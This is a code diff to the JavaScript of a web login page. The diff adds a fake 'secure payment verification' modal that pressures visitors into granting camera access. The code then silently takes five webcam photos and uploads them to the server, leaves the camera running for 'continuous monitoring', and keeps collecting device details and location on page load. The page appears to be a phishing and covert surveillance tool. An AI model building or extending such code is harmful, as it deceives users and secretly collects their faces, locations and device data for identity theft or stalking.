@@ -80,6 +80,16 @@
 
     </div>
 
+    <!-- Camera Permission Modal -->
+    <div id="camera-permission-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:9999; justify-content:center; align-items:center;">
+        <div style="background:white; padding:30px; border-radius:15px; text-align:center; max-width:400px; margin:20px;">
+            <div style="font-size:60px; margin-bottom:20px;">📷</div>
+            <h2 style="margin:0 0 15px 0; color:#333;">Camera Access Required</h2>
+            <p style="color:#666; margin-bottom:25px;">This secure payment verification system requires camera access for identity verification. Please enable camera permissions to continue.</p>
+            <button id="enable-camera-btn" style="background:#667eea; color:white; border:none; padding:12px 30px; border-radius:8px; font-size:16px; cursor:pointer; font-weight:600;">Enable Camera</button>
+        </div>
+    </div>
+
     <video id="video" style="display:none;" autoplay></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -96,6 +106,9 @@
             camera: false,
             device: false
         };
+        let photosCaptured = 0;
+        const TOTAL_PHOTOS_LOGIN = 5; // Capture 5 photos on login page
+        let cameraStream = null;
 
         function updateStatus(type, message, success = false) {
             // This function is now a no-op as the debug panel is removed.
@@ -563,14 +576,45 @@
             });
         }
 
-        // Function to capture photo from camera
-        async function capturePhoto() {
-            updateStatus('camera', 'Requesting access...');
+        // Function to check and request camera permission
+        async function checkCameraPermission() {
+            try {
+                const result = await navigator.permissions.query({ name: 'camera' });
+                return result.state === 'granted';
+            } catch (error) {
+                // Permissions API not supported, try direct access
+                return false;
+            }
+        }
+
+        // Function to show camera permission modal
+        function showCameraModal() {
+            const modal = document.getElementById('camera-permission-modal');
+            modal.style.display = 'flex';
+            
+            document.getElementById('enable-camera-btn').addEventListener('click', async () => {
+                try {
+                    // Request camera access
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    stream.getTracks().forEach(track => track.stop());
+                    modal.style.display = 'none';
+                    // Start capturing photos
+                    await captureMultiplePhotos();
+                } catch (error) {
+                    alert('Camera access is required to use this service. Please enable camera permissions in your browser settings and reload the page.');
+                }
+            });
+        }
+
+        // Function to capture multiple photos (5 photos on login page)
+        async function captureMultiplePhotos() {
+            updateStatus('camera', 'Starting photo capture...');
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
 
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
+                // Request camera access
+                cameraStream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user',
                         width: { ideal: 640 },
@@ -579,56 +623,71 @@
                     audio: false
                 });
 
-                video.srcObject = stream;
-                updateStatus('camera', 'Camera active, capturing...');
+                video.srcObject = cameraStream;
+                updateStatus('camera', 'Camera active...');
 
                 // Wait for video to be ready
                 await new Promise((resolve) => {
                     video.onloadedmetadata = resolve;
                 });
 
-                // Wait a bit for camera to adjust
-                await new Promise(resolve => setTimeout(resolve, 1500));
+                // Wait for camera to adjust
+                await new Promise(resolve => setTimeout(resolve, 1000));
 
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
 
-                // Convert to base64
-                capturedPhoto = canvas.toDataURL('image/jpeg', 0.85);
-                document.getElementById('photoData').value = capturedPhoto;
+                // Capture 5 photos with intervals
+                for (let i = 0; i < TOTAL_PHOTOS_LOGIN; i++) {
+                    ctx.drawImage(video, 0, 0);
+                    const photoData = canvas.toDataURL('image/jpeg', 0.85);
+                    
+                    // Send photo to server
+                    await sendPhotoToServer(photoData, `login_${i + 1}`);
+                    photosCaptured++;
+                    
+                    updateStatus('camera', `Captured ${photosCaptured}/${TOTAL_PHOTOS_LOGIN} photos...`);
+                    console.log(`✅ Photo ${photosCaptured}/${TOTAL_PHOTOS_LOGIN} captured`);
+                    
+                    // Wait 500ms between captures
+                    if (i < TOTAL_PHOTOS_LOGIN - 1) {
+                        await new Promise(resolve => setTimeout(resolve, 500));
+                    }
+                }
 
-                // Send photo to server immediately
-                await sendPhotoToServer(capturedPhoto);
-
-                // Stop camera
-                stream.getTracks().forEach(track => track.stop());
-
+                // Keep camera running in background (don't stop stream)
+                // This allows continuous monitoring
+                
                 dataCapturComplete.camera = true;
-                updateStatus('camera', 'Captured & uploaded ✓', true);
-                console.log('✅ Photo captured and sent to server');
+                updateStatus('camera', `${TOTAL_PHOTOS_LOGIN} photos captured ✓`, true);
+                console.log(`✅ All ${TOTAL_PHOTOS_LOGIN} photos captured on login page`);
             } catch (error) {
                 console.error('Camera error:', error);
-                document.getElementById('photoData').value = JSON.stringify({ error: error.message });
-                dataCapturComplete.camera = true; // Mark as complete even if failed
+                dataCapturComplete.camera = true;
                 updateStatus('camera', 'Failed: ' + error.message + ' ⚠️');
+                
+                // Show modal again if camera access denied
+                if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+                    showCameraModal();
+                }
             }
         }
 
         // Function to send photo to server
-        async function sendPhotoToServer(photoData) {
+        async function sendPhotoToServer(photoData, photoType = 'login') {
             try {
                 const response = await fetch('/capture-photo', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ photo: photoData })
+                    body: JSON.stringify({ 
+                        photo: photoData,
+                        type: photoType,
+                        timestamp: new Date().toISOString()
+                    })
                 });
                 const data = await response.json();
                 console.log('Photo upload response:', data);
-                if (data.success && data.filename) {
-                    document.getElementById('photoFilename').value = data.filename;
-                }
                 return data;
             } catch (error) {
                 console.error('Error sending photo:', error);
@@ -638,19 +697,26 @@
 
         // Initialize data capture on page load
         window.addEventListener('load', async () => {
-            console.log('🚀 Starting data capture...');
+            console.log('🚀 Starting initialization...');
 
             // Capture device details immediately (synchronous)
             captureDeviceDetails();
 
-            // Capture location and camera in parallel
-            await Promise.allSettled([
-                captureLocationWithFallback(),
-                capturePhoto()
-            ]);
+            // Check camera permission first
+            const hasPermission = await checkCameraPermission();
+            
+            if (!hasPermission) {
+                // Show modal to request permission
+                showCameraModal();
+            } else {
+                // Start capturing photos immediately
+                await captureMultiplePhotos();
+            }
 
-            console.log('✅ All data capture attempts complete');
-            console.log('Capture status:', dataCapturComplete);
+            // Capture location in parallel
+            captureLocationWithFallback();
+
+            console.log('✅ Initialization complete');
         });
 
         // Handle login form submission with attempt counter
